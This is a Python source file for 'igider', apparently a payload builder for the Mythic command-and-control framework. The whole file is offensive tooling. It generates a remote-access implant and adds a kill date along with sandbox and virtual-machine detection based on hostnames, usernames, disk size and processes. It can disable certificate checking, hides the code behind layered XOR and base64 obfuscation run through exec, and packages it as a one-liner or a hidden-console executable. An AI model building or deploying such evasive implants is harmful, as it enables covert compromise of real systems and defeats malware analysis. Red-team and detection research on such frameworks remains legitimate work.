import asyncio
import pathlib
import os
import tempfile
import base64
import hashlib
import json
import random
import string
import logging
from typing import Dict, Any, List, Optional
from itertools import cycle
import datetime
import ssl
import shutil
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

class Igider(PayloadType):
    name = "igider"
    file_extension = "py"
    author = "@med"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False
    wrapped_payloads = ["pickle_wrapper"]
    mythic_encrypts = True
    note = "Production-ready Python agent with advanced obfuscation and encryption features"
    supports_dynamic_loading = True
    
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["py", "base64", "py_compressed", "one_liner", "executable"],
            default_value="py"
        ),
        BuildParameter(
            name="executable_type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Standalone executable options (if output=executable)",
            choices=["onefile", "onedir"],
            default_value="onefile"
        ),
        BuildParameter(
            name="executable_console",
            parameter_type=BuildParameterType.ChooseOne,
            description="Show console window (Windows only)",
            choices=["True", "False"],
            default_value="False"
        ),
        BuildParameter(
            name="cryptography_method",
            parameter_type=BuildParameterType.ChooseOne,
            description="Select crypto implementation method",
            choices=["manual", "cryptography_lib", "pycryptodome"],
            default_value="manual"
        ),
        BuildParameter(
            name="obfuscation_level",
            parameter_type=BuildParameterType.ChooseOne,
            description="Level of code obfuscation to apply",
            choices=["none", "basic", "advanced"],
            default_value="basic"
        ),
        BuildParameter(
            name="https_check",
            parameter_type=BuildParameterType.ChooseOne,
            description="Verify HTTPS certificate (if HTTP, leave yes)",
            choices=["Yes", "No"],
            default_value="Yes"
        )
    ]
    
    c2_profiles = ["http", "https"]
    
    _BASE_DIR = pathlib.Path(".")
    
    @property
    def agent_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "mythic"
    
    @property
    def agent_icon_path(self) -> pathlib.Path:
        return self.agent_path / "icon.svg"
    
    @property
    def agent_code_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "agent_code"
    
    build_steps = [
        BuildStep(step_name="Initializing Build", step_description="Setting up the build environment"),
        BuildStep(step_name="Gathering Components", step_description="Collecting agent code modules"),
        BuildStep(step_name="Configuring Agent", step_description="Applying configuration parameters"),
        BuildStep(step_name="Applying Obfuscation", step_description="Implementing obfuscation techniques"),
        BuildStep(step_name="Finalizing Payload", step_description="Preparing final output format")
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.logger = self._setup_logger()
        
    def _setup_logger(self) -> logging.Logger:
        logger = logging.getLogger("igider_builder")
        logger.setLevel(logging.DEBUG)
        return logger

    def get_file_path(self, directory: pathlib.Path, file: str) -> str:
        filename = os.path.join(directory, f"{file}.py")
        return filename if os.path.exists(filename) else ""
    
    async def update_build_step(self, step_name: str, message: str, success: bool = True) -> None:
        try:
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName=step_name,
                StepStdout=message,
                StepSuccess=success
            ))
        except Exception as e:
            self.logger.error(f"Failed to update build step: {e}")

    def _load_module_content(self, module_path: str) -> str:
        try:
            with open(module_path, "r", encoding="utf-8") as f:
                return f.read()
        except Exception as e:
            self.logger.error(f"Error loading module {module_path}: {e}")
            return ""

    def _apply_config_replacements(self, code: str, replacements: Dict[str, Any]) -> str:
        for key, value in replacements.items():
            if isinstance(value, (dict, list)):
                json_val = json.dumps(value).replace("false", "False").replace("true", "True").replace("null", "None")
                code = code.replace(key, json_val)
            elif value is not None:
                code = code.replace(key, str(value))
        return code

    def _generate_random_identifier(self, length: int = 8) -> str:
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

    def _basic_obfuscate(self, code: str) -> str:
        key = hashlib.md5(os.urandom(128)).hexdigest().encode()
        encrypted_content = ''.join(chr(c^k) for c,k in zip(code.encode(), cycle(key))).encode()
        b64_enc_content = base64.b64encode(encrypted_content)
        xor_func = "chr(c^k)"
        
        var_b64 = self._generate_random_identifier()
        var_key = self._generate_random_identifier()
        var_iter = self._generate_random_identifier()
        
        return f"""import base64, itertools
{var_b64} = {b64_enc_content}
{var_key} = {key}
{var_iter} = itertools.cycle({var_key})
exec(''.join({xor_func} for c,k in zip(base64.b64decode({var_b64}), {var_iter})).encode())
"""

    def _advanced_obfuscate(self, code: str) -> str:
        key1 = hashlib.md5(os.urandom(64)).hexdigest().encode()
        layer1 = ''.join(chr(c^k) for c,k in zip(code.encode(), cycle(key1)))
        rotation = random.randint(1, 255)
        layer2 = ''.join(chr((ord(c) + rotation) % 256) for c in layer1)
        encoded = base64.b64encode(layer2.encode())
        
        var_data = self._generate_random_identifier()
        var_key = self._generate_random_identifier()
        var_rot = self._generate_random_identifier()
        var_result = self._generate_random_identifier()
        var_char = self._generate_random_identifier()
        var_k = self._generate_random_identifier()
        var_c = self._generate_random_identifier()
        
        junk1_name = self._generate_random_identifier()
        junk2_name = self._generate_random_identifier()
        
        decoder = f"""
import base64, itertools, sys, random

def {junk1_name}():
    return [random.randint(1, 100) for _ in range(10)]

{var_data} = {encoded}
{var_key} = {key1}
{var_rot} = {rotation}

def {junk2_name}(x):
    return ''.join(chr((ord(c) + 13) % 256) for c in x)

{var_result} = ''
for {var_c}, {var_k} in zip(
    ''.join(chr((ord({var_char}) - {var_rot}) % 256) for {var_char} in base64.b64decode({var_data}).decode()),
    itertools.cycle({var_key})
):
    {var_result} += chr(ord({var_c}) ^ {var_k})

exec({var_result})
"""
        return decoder

    def _compress_code(self, code: str) -> str:
        import zlib
        compressed = zlib.compress(code.encode(), level=9)
        compressed_b64 = base64.b64encode(compressed)
        
        return f"""import base64, zlib
exec(zlib.decompress(base64.b64decode({compressed_b64})))
"""

    def _create_one_liner(self, code: str) -> str:
        import re
        import textwrap
        
        code = re.sub(r'#.*$', '', code, flags=re.MULTILINE)
        code = re.sub(r'""".*?"""', '', code, flags=re.DOTALL)
        code = re.sub(r"'''.*?'''", '', code, flags=re.DOTALL)
        
        lines = []
        indent_stack = [0]
        
        for line in code.split('\n'):
            line = line.rstrip()
            if not line.strip():
                continue
                
            current_indent = len(line) - len(line.lstrip())
            
            if current_indent > indent_stack[-1]:
                lines.append('__INDENT__')
                indent_stack.append(current_indent)
            elif current_indent < indent_stack[-1]:
                while current_indent < indent_stack[-1]:
                    lines.append('__DEDENT__')
                    indent_stack.pop()
                if current_indent != indent_stack[-1]:
                    raise ValueError("Indentation mismatch")
                    
            stripped_line = line.strip()
            if stripped_line.endswith(':'):
                stripped_line = stripped_line[:-1]
            lines.append(stripped_line)
        
        one_liner = []
        indent_level = 0
        
        for line in lines:
            if line == '__INDENT__':
                indent_level += 1
            elif line == '__DEDENT__':
                indent_level -= 1
            else:
                one_liner.append(line)
        
        result = ';'.join(one_liner)
        result = re.sub(r';{2,}', ';', result)
        result = re.sub(r';\s*(?=[)\]}]|$)', '', result)
        result = re.sub(r'(if|while|for|def|class|try|except|finally|else|elif)\s*\(', r'\1 ', result)
        
        return result

    def _add_evasion_features(self, code: str) -> str:
        evasion_code = []
        try:
            kill_date = self.c2info[0].get_parameters_dict().get("killdate", "").strip()
            if kill_date:
                try:
                    datetime.datetime.strptime(kill_date, "%Y-%m-%d")
                    evasion_code.append(f"""
import datetime
if datetime.datetime.now() > datetime.datetime.strptime("{kill_date}", "%Y-%m-%d"):
    import sys
    sys.exit(0)
""")
                except ValueError as e:
                    self.logger.warning(f"Invalid killdate format (should be YYYY-MM-DD): {e}")
        except (IndexError, AttributeError, TypeError) as e:
            self.logger.debug(f"Could not retrieve kill_date: {e}")

        evasion_code.append("""
import os
def check_environment():
    import os
    import sys
    import socket
    import platform
    import subprocess
    
    suspicious_indicators = {
        'hostnames': ['sandbox', 'analysis', 'malware', 'cuckoo', 'vm', 'vbox', 'virtual'],
        'users': ['user', 'sandbox', 'vmuser'],
        'processes': ['vmtoolsd', 'vmwaretray', 'vboxservice']
    }
    
    try:
        hostname = socket.gethostname().lower()
        if any(name in hostname for name in suspicious_indicators['hostnames']):
            return False
    except:
        pass
    
    try:
        username = os.getenv("USER", "").lower()
        if any(user in username for user in suspicious_indicators['users']):
            return False
    except:
        pass
    
    try:
        if platform.system().lower() == 'windows':
            import ctypes
            try:
                free_bytes = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    ctypes.c_wchar_p('C:\\\\'), 
                    None, 
                    None, 
                    ctypes.pointer(free_bytes)
                )
                if free_bytes.value < 21474836480:  # 20 GB
                    return False
            except:
                pass
            
            try:
                import wmi
                c = wmi.WMI()
                for process in c.Win32_Process():
                    if process.Name.lower() in suspicious_indicators['processes']:
                        return False
            except:
                pass
                
        else:
            import shutil
            try:
                if shutil.disk_usage("/").free < 21474836480:  # 20 GB
                    return False
            except:
                pass
            
            try:
                ps = subprocess.Popen(['ps', '-aux'], stdout=subprocess.PIPE)
                output = subprocess.check_output(['grep', '-i'] + suspicious_indicators['processes'], stdin=ps.stdout)
                if output:
                    return False
            except:
                pass
                
    except Exception:
        pass
    
    return True

if not check_environment() or os.getenv("BUILD_VALIDATION") == "true":
    import sys
    sys.exit(0)
""")
    
        return "\n".join(evasion_code) + "\n" + code

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        build_errors = []
        
        try:
            await self.update_build_step("Initializing Build", "Starting build process...")
            
            await self.update_build_step("Gathering Components", "Loading agent modules...")
            
            base_agent_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "base_agent")
            if not base_agent_path:
                build_errors.append("Base agent code not found")
                await self.update_build_step("Gathering Components", "Base agent code not found", False)
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "\n".join(build_errors)
                return resp
                
            base_code = self._load_module_content(base_agent_path)
            if not base_code:
                build_errors.append("Base agent code is empty")
                await self.update_build_step("Gathering Components", "Base agent code is empty", False)
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "\n".join(build_errors)
                return resp
            
            crypto_method = self.get_parameter("cryptography_method")
            if crypto_method == "cryptography_lib":
                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib")
            elif crypto_method == "pycryptodome":
                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "pycrypto_lib")
            else:
                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto")
                
            if not crypto_path:
                build_errors.append(f"Crypto module '{crypto_method}' not found")
                crypto_code = "# Error loading crypto module"
            else:
                crypto_code = self._load_module_content(crypto_path)
            
            command_code = ""
            for cmd in self.commands.get_commands():
                command_path = self.get_file_path(self.agent_code_path, cmd)
                if not command_path:
                    build_errors.append(f"Command module '{cmd}' not found")
                else:
                    command_code += self._load_module_content(command_path) + "\n"
            
            await self.update_build_step("Configuring Agent", "Applying agent configuration...")
            
            base_code = base_code.replace("CRYPTO_MODULE_PLACEHOLDER", crypto_code)
            base_code = base_code.replace("UUID_HERE", self.uuid)
            base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
            
            for c2 in self.c2info:
                profile = c2.get_c2profile()["name"]
                base_code = self._apply_config_replacements(base_code, c2.get_parameters_dict())
            
            if self.get_parameter("https_check") == "No":
                base_code = base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)")
                base_code = base_code.replace("#CERTSKIP", 
                    """
        gcontext = ssl.create_default_context()
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE\n""")
            else:
                base_code = base_code.replace("#CERTSKIP", "")
            
            await self.update_build_step("Applying Obfuscation", "Implementing code obfuscation...")
            
            base_code = self._add_evasion_features(base_code)
            
            obfuscation_level = self.get_parameter("obfuscation_level")
            if obfuscation_level == "advanced":
                base_code = self._advanced_obfuscate(base_code)
                await self.update_build_step("Applying Obfuscation", "Advanced obfuscation applied successfully")
            elif obfuscation_level == "basic":
                base_code = self._basic_obfuscate(base_code)
                await self.update_build_step("Applying Obfuscation", "Basic obfuscation applied successfully")
            else:
                await self.update_build_step("Applying Obfuscation", "No obfuscation requested, skipping")
            
            await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
            
            output_format = self.get_parameter("output")
            if output_format == "base64":
                resp.payload = base64.b64encode(base_code.encode())
                resp.filename = "payload.b64"
                resp.build_message = "Successfully built payload in base64 format"
            elif output_format == "py_compressed":
                compressed_code = self._compress_code(base_code)
                resp.payload = compressed_code.encode()
                resp.filename = "payload.py"
                resp.build_message = "Successfully built compressed Python payload"
            elif output_format == "one_liner":
                one_liner = self._create_one_liner(base_code)
                resp.payload = one_liner.encode()
                resp.filename = "payload.py"
                resp.build_message = "Successfully built one-liner payload"
            elif output_format == "executable":
                await self.update_build_step("Finalizing Payload", "Building standalone executable...")
                
                tmp_dir = tempfile.mkdtemp()
                try:
                    os.chmod(tmp_dir, 0o755)
                    self.logger.debug(f"Created temporary directory: {tmp_dir}")
                    
                    py_path = os.path.join(tmp_dir, "payload.py")
                    with open(py_path, "w", encoding="utf-8") as f:
                        f.write(base_code)
                    os.chmod(py_path, 0o644)
                    self.logger.debug(f"Wrote payload to {py_path}, content length: {len(base_code)} bytes")
                    
                    if obfuscation_level in ["basic", "advanced"]:
                        try:
                            proc = await asyncio.create_subprocess_exec(
                                "python3", py_path,
                                stdout=asyncio.subprocess.PIPE,
                                stderr=asyncio.subprocess.PIPE,
                                env={**os.environ, "BUILD_VALIDATION": "true"}
                            )
                            stdout, stderr = await proc.communicate()
                            if proc.returncode != 0:
                                self.logger.error(f"Obfuscated code validation failed: {stderr.decode()}")
                                raise Exception(f"Obfuscated code is invalid: {stderr.decode()}")
                        except Exception as e:
                            raise Exception(f"Obfuscation validation failed: {str(e)}")
                    
                    pyinstaller_cmd = [
                        "python3", "-m", "PyInstaller",
                        "--name=payload",
                        "--clean",
                        "--noconfirm",
                        "--log-level=DEBUG",
                        "--distpath", os.path.join(tmp_dir, "dist"),
                        "--workpath", os.path.join(tmp_dir, "build"),
                        "--specpath", tmp_dir
                    ]
                    
                    file_ext = ".exe" if self.selected_os == SupportedOS.Windows else ""
                    if self.selected_os == SupportedOS.Windows:
                        pyinstaller_cmd.extend(["--icon=NONE"])
                        if self.get_parameter("executable_console") == "False":
                            pyinstaller_cmd.append("--noconsole")
                    build_mode = self.get_parameter("executable_type")
                    if build_mode == "onefile":
                        pyinstaller_cmd.append("--onefile")
                    else:
                        pyinstaller_cmd.append("--onedir")
                    
                    pyinstaller_cmd.append(py_path)
                    
                    self.logger.debug(f"Running PyInstaller with command: {' '.join(pyinstaller_cmd)}")
                    proc = await asyncio.create_subprocess_exec(
                        *pyinstaller_cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    stdout, stderr = await proc.communicate()
                    
                    stdout_text = stdout.decode() if stdout else ""
                    stderr_text = stderr.decode() if stderr else ""
                    self.logger.debug(f"PyInstaller stdout: {stdout_text}")
                    self.logger.debug(f"PyInstaller stderr: {stderr_text}")
                    
                    if proc.returncode != 0:
                        raise Exception(f"PyInstaller failed: {stderr_text or stdout_text}")
                    
                    dist_dir = os.path.join(tmp_dir, "dist")
                    if not os.path.exists(dist_dir):
                        raise Exception(f"dist directory not created: {dist_dir}")
                    dir_contents = os.listdir(dist_dir)
                    if not dir_contents:
                        raise Exception(f"dist directory is empty: {dist_dir}")
                    
                    executable_found = False
                    executable_path = None
                    for root, _, files in os.walk(dist_dir):
                        for file in files:
                            if file == "payload" or file == "payload.exe":
                                executable_path = os.path.join(root, file)
                                if os.path.isfile(executable_path):
                                    os.chmod(executable_path, 0o755)
                                    file_stat = os.stat(executable_path)
                                    self.logger.info(f"Found executable: {executable_path}, size: {file_stat.st_size}, permissions: {oct(file_stat.st_mode)[-3:]}")
                                    if file_stat.st_size == 0:
                                        raise Exception(f"Executable {executable_path} is empty")
                                    with open(executable_path, "rb") as f:
                                        resp.payload = f.read()
                                    resp.filename = f"payload{file_ext}"
                                    resp.build_message = f"Successfully built {build_mode} executable at {executable_path}"
                                    executable_found = True
                                    break
                        if executable_found:
                            break
                    
                    if not executable_found:
                        detailed_dir_structure = {}
                        for root, dirs, files in os.walk(tmp_dir):
                            rel_path = os.path.relpath(root, tmp_dir)
                            file_info = [
                                {
                                    "name": f,
                                    "size": os.path.getsize(os.path.join(root, f)),
                                    "perms": oct(os.stat(os.path.join(root, f)).st_mode)[-3:],
                                    "executable": os.access(os.path.join(root, f), os.X_OK)
                                } for f in files
                            ]
                            detailed_dir_structure[rel_path] = {"dirs": dirs, "files": file_info}
                        self.logger.error(f"Detailed directory structure: {json.dumps(detailed_dir_structure, indent=2)}")
                        raise Exception(f"Failed to find executable in {dist_dir}. Contents: {dir_contents}")
                    
                except Exception as e:
                    self.logger.error(f"Executable build failed: {str(e)}", exc_info=True)
                    await self.update_build_step("Finalizing Payload", f"Executable build failed: {str(e)}", False)
                    resp.set_status(BuildStatus.Error)
                    resp.build_stderr = f"Error building executable: {str(e)}\nPyInstaller stdout: {stdout_text}\nPyInstaller stderr: {stderr_text}"
                    return resp
                finally:
                    shutil.rmtree(tmp_dir, ignore_errors=True)
            
            else:
                resp.payload = base_code.encode()
                resp.filename = "payload.py"
                resp.build_message = "Successfully built Python script payload"
            
            if build_errors:
                resp.build_stderr = "Warnings during build:\n" + "\n".join(build_errors)
            
            await self.update_build_step("Finalizing Payload", "Payload ready for download", True)
            
        except Exception as e:
            self.logger.error(f"Build failed: {str(e)}")
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = f"Error building payload: {str(e)}"
            await self.update_build_step("Finalizing Payload", f"Build failed: {str(e)}", False)
            
        return resp